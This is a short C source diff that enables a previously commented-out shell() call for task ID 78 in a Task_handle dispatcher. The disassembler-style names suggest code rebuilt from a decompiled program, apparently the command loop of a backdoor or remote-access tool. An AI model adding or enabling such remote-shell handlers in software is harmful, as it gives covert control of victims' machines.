@@ -4,6 +4,7 @@
 #include "global.h"
 #include "data_deal.h"
 #include "function.h"
+#include "shell.h"
 
 void Task_handle(char* Src, int size, int a3);
 
@@ -284,7 +285,7 @@ void Task_handle(char* Taskdata, int Taskdata_size, int Taskdata_id)
 		//sub_100031C4(Taskdata, Taskdata_size);
 		return;
 	case 78:
-		//shell(Taskdata, Taskdata_size);
+		shell(Taskdata, Taskdata_size);
 		//printf("%")
 		//sub_10002A5B(Taskdata, Taskdata_size);
 		return;
